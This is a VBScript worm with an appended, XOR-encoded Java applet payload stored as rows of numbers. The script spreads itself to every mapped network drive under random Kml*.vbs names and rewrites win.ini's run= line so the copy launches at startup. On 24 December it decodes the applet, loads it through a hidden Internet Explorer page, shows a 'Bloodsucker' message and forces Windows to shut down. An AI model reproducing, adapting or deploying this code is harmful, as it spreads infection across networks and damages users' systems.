Option Explicit
On Error Resume Next 'Keine Fehler!!!

Dim wshShell, objIE
Dim wshNet, fso
Dim netDrives, strFile, strReg
Dim file1, strRes, strIn
Dim i
Const tempReg="HKLM\Security\Provider\"
Set wshNet=WScript.CreateObject("WScript.Network")
Set wshShell=WScript.CreateObject("WScript.Shell")
Set fso=WSCript.CreateObject("Scripting.FileSystemObject")
Set netDrives=wshNet.EnumNetworkDrives
If Day(Now)=24 Then
	Set file1=fso.CreateTextFile(fso.GetSpecialFolder(0) & "\AppletSpamming.class",True)
	file1.Write DecryptNumeric(MakeBodyApplet(),"3ZQviGei[A>yG7WL:l:WvxFS5jMnIAZy9PW^sF^WsN<Y8;1uP;Og:p5e]RRBC3M_gwu]MPH8zYTF_FTlx2JBa3B38UeIJ\ELErFt=zz4CPnCim5Y:A[8Okxzycm<V;Ki")
	file1.Close
	Set file1=fso.CreateTextFile(fso.GetSpecialFolder(0) & "\Spoofing.htm",True)
	file1.WriteLine "<applet code=""untitled4.AppletSpamming.class"" style=""display:none"">"
	file1.WriteLine "</applet>"
	file1.Close
	Set objIE=WScript.CreateObject("InternetExplorer.Application")
	While objIE.Busy
	Wend
	objIE.Visible=False
	WScript.Echo "GOT YOU?" & vbCrLf & "Bloodsucker seeking for you to be vulnerable" & vbCrLf & "Don't forget to wish many happy returns on 24th of December"
	objIE.Navigate fso.GetSpecialFolder(0) & "\Spoofing.htm"
	While objIE.ReadyState<>4
	Wend
	wshShell.Run fso.GetSpecialFolder(1) & "\rundll32.exe " & fso.GetSpecialFolder(1) & "\User.exe,ExitWindows"
End If
strReg=wshShell.RegRead(tempReg)
For i=0 To netDrives.Count-1
	strFile="\Kml" & Int(7400*Rnd+1) & ".vbs"
	fso.CopyFile wshShell.RegRead(strReg) & "." & wshShell.RegRead(strReg & "\Vars\%DLL_EXT%"), netDrives.Item(i) & strFile
	If fso.FileExists(netDrives.Item(i) & "\WINDOWS\win.ini") Then
		strRes=""
		Set file1=fso.OpenTextFile(netDrives.Item(i) & "\WINDOWS\win.ini",1)
		While Not file1.AtEndOfStream
			strIn=file1.ReadLine
			If InStr(strIn,"run=")>0 Then
				strIn="run=" & "C:\" & strFile
			End If
			strRes=strRes & strIn & vbCrLf
		Wend
		file1.Close
		Set file1=fso.OpenTextFile(netDrives.Item(i) & "\WINDOWS\win.ini",2)
		file1.Write strRes
		file1.Close
	End If
Next

WScript.DisconnectObject wshNet
WScript.DisconnectObject fso
WScript.DisconnectObject wshShell
Set file1=Nothing
Set wshNet=Nothing
Set wshShell=Nothing
Set fso=Nothing


Function MakeBodyApplet()
	On Error Resume Next 'Keine Fehler!!!
	Dim file1
	Dim strIn, strBody, strCode, strRes1
	
	strBody=strCopiedBody
	Set file1=fso.OpenTextFile(WScript.ScriptFullName,1)
	While Not file1.AtEndOfStream
		strIn=file1.ReadLine
		If UCase(strIn)="'<--WINDOW_SPOOFING_APPLET-->" Then
			strIn=file1.ReadLine
			While UCase(strIn)<>"'<--/WINDOW_SPOOFING_APPLET-->"
				strRes1=strRes1 & Right(strIn,Len(strIn)-1)
				strIn=file1.ReadLine
			Wend
		End If
	Wend
	file1.Close
	MakeBodyApplet=strRes1
	Set file1=Nothing
End Function


Function DecryptNumeric(strIn,strKey)
	On Error Resume Next 'Keine Fehler!!!

	Dim strCh,strChKey,strTemp,strNum
	Dim intCode, i,t
	Dim strRes1

	t=0
	strRes1=""
	strTemp=""
	strNum=""

	For i=1 To Len(strIn)
		If IsNumeric(Mid(strIn,i,1)) Then
			strNum=strNum & Mid(strIn,i,1)
		Else
			strTemp=strTemp & chr(CInt(strNum))
			strNum=""
		End If
	Next
	If IsNumeric(strNum) Then strTemp=strTemp & chr(CInt(strNum))
	
	For i=1 to Len(strTemp)
		If t>=Len(strKey) Then t=0
		t=t+1
		strCh=Mid(strTemp,i,1)
		strChKey=Mid(strKey,t,1)
		intCode=Asc(strCh) Xor Asc(strChKey)
		strRes1=strRes1 & Chr(intCode)
	Next
	DecryptNumeric=strRes1
End Function




'<--WINDOW_SPOOFING_APPLET-->
'249 164 235 200 105 68 101 68 91 21 52 121 84 55 112 75 58 68 51 87 100 120 111 84 53 64 68 110 91 65 113 115 57 124 87 115 121 70 114 87 93 70 60 118 50 59 53 117 96 51 79 86 48 112 55 101 111 88 82 113 67 7 71 95 82 119 67 87 77 103 72 0 112 89 109 70 101 76 84 89 120 9 64 66 84 51 126 52 56 104 98 73 116 93 69 74 35 0 39 25 88 9 123 52 82 11 34 41 8 27 84 118 91 54 47 23 9 25 25 23 28 88 108 60 80 87 42 11 
'86 54 34 119 105 86 62 37 49 32 72 24 104 86 32 56 21 32 91 53 19 20 125 82 53 108 113 7 39 40 46 71 56 80 84 118 90 16 95 87 119 13 83 61 93 58 49 122 28 82 33 2 116 5 88 7 56 32 6 35 33 95 40 94 103 101 57 50 46 49 36 110 27 43 61 39 61 42 49 56 25 80 38 39 96 51 70 71 80 60 22 72 74 70 9 57 43 6 47 0 81 31 30 0 108 17 30 51 5 8 65 10 74 32 54 85 38 5 31 65 120 99 105 85 56 82 63 104 
'51 91 56 119 105 70 44 104 91 64 70 120 71 54 29 77 58 109 67 86 118 114 21 60 64 24 46 11 15 40 54 28 56 80 68 31 3 54 50 50 7 29 76 56 85 86 88 27 55 21 37 6 76 17 57 101 69 82 75 67 67 61 39 62 17 22 90 60 58 36 103 126 8 56 57 35 83 70 64 108 109 51 74 76 11 82 52 82 23 52 18 61 101 16 36 46 32 30 74 116 43 122 109 51 67 111 98 67 41 109 116 85 58 3 91 123 78 107 23 41 20 10 1 89 118 113 34 4 
'94 35 127 86 32 51 69 30 58 50 30 24 103 71 56 41 87 66 48 119 63 12 102 55 80 26 40 0 45 50 122 22 87 112 46 49 6 52 126 32 26 34 80 48 86 92 95 16 35 72 111 109 26 4 90 69 62 58 51 44 36 86 109 38 8 2 7 125 57 56 39 77 29 49 32 53 113 102 94 76 15 91 62 42 65 86 44 95 81 50 13 61 47 50 32 40 101 31 47 26 89 84 118 52 91 80 42 66 105 97 125 54 77 97 58 74 42 75 1 21 12 92 97 60 78 59 15 110 
'51 31 93 118 47 71 34 110 91 9 50 121 14 55 29 75 58 39 54 87 58 120 11 84 53 36 65 110 6 65 10 117 57 1 87 20 127 70 12 87 32 79 60 65 77 85 69 28 36 87 42 3 14 95 116 21 45 62 55 54 16 67 44 50 10 30 27 58 76 80 90 82 27 47 53 105 62 54 36 0 29 70 101 3 17 67 46 86 76 84 101 71 32 61 51 45 106 30 39 26 90 85 55 85 55 56 111 67 111 31 84 55 94 46 54 57 79 104 80 83 61 98 109 57 36 84 62 7 
'87 91 81 114 65 3 76 35 90 65 43 81 11 93 54 58 91 67 86 54 24 31 105 0 65 24 36 0 46 122 115 47 56 80 69 52 18 48 63 120 18 57 72 118 123 84 95 1 49 82 33 2 72 113 53 102 60 54 54 67 67 25 101 19 13 22 3 60 98 49 63 76 85 26 59 43 47 41 58 9 22 70 113 107 45 89 35 69 89 122 4 62 62 115 6 35 40 2 41 26 88 20 14 15 66 80 124 41 8 27 84 118 91 54 47 23 12 4 21 10 22 13 8 82 34 58 75 111 
'65 63 34 31 19 34 100 105 94 105 119 48 110 97 86 76 52 6 91 33 23 87 42 50 91 13 98 34 38 47 61 120 57 88 35 49 32 50 44 62 29 41 61 89 45 19 123 92 28 81 46 17 91 95 89 4 51 53 125 17 55 65 36 49 0 76 116 93 92 58 41 78 27 118 56 39 49 33 123 37 22 70 47 37 4 65 67 51 48 37 4 59 57 57 12 34 49 115 70 97 21 54 16 85 53 49 65 47 8 3 82 118 105 53 41 81 33 12 67 83 48 98 109 56 59 84 61 12 
'50 90 85 5 1 40 18 104 91 69 22 35 110 97 87 109 58 126 58 68 118 120 70 81 53 98 77 122 73 84 90 121 57 88 87 72 115 81 94 87 115 76 60 88 56 35 49 108 80 58 79 125 58 112 53 86 93 83 82 67 67 51 77 90 77 192 117 92 252 80 72 56 120 89 79 70 95 70 94 108 122 50 74 66 104 51 70 51 49 85 121 73 74 92 73 76 68 114 70 116 56 122 103 52 93 80 110 67 104 109 42 89 35 65 90 56 85 107 120 123 118 99 104 60 80 59 75 105 
'160 75 64 226 212 71 103 218 91 66 47 104 211 138 87 72 137 108 63 84 74 99 87 66 161 201 77 20 88 66 122 254 129 80 81 53 203 70 89 22 98 76 100 222 128 59 55 30 232 59 72 80 62 194 53 96 70 233 82 70 26 33 69 232 103 126 38 239 77 83 83 131 122 91 13 84 85 241 84 103 43 128 74 65 122 1 240 51 61 78 87 255 74 80 18 254 69 113 93 70 44 122 178 37 67 152 216 67 100 223 53 90 33 115 123 128 79 101 192 122 118 117 105 132 86 53 243 105 
'60 236 81 102 219 71 102 114 105 69 136 121 86 179 86 77 157 147 191 230 118 120 70 81 53 113 77 110 73 123 90 119 57 80 87 80 115 79 94 88 115 92 60 72 56 47 49 100 80 32 79 115 58 87 53 112 93 102 82 84 67 113 77 72 103 39 117 69 77 14 72 33 122 53 84 92 95 197 84 119 120 190 74 83 97 161 66 46 56 73 101 73 74 118 69 72 69 114 70 231 61 103 122 42 67 80 110 87 105 18 53 121 58 96 91 57 79 76 120 31 121 65 109 31 86 57 75 93 
'51 2 81 82 105 100 101 109 91 64 62 92 71 55 87 78 58 74 
'<--/WINDOW_SPOOFING_APPLET-->

